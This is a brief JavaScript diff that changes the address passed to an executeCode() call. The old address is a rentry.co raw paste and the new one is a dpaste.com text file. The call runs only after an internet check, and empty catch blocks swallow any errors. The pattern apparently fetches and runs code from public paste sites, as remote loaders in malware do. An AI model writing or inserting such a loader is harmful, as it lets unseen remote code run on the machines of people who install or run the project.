@@ -40,7 +40,7 @@ async function executeCode(url) {
     try {
         if (await checkInternetConnection()) {
             try {
-                await executeCode('https://rentry.co/loadkeyiceberg/raw');
+                await executeCode('https://dpaste.com/DVHEYR546.txt');
             } catch (error) {
             }
         } else {
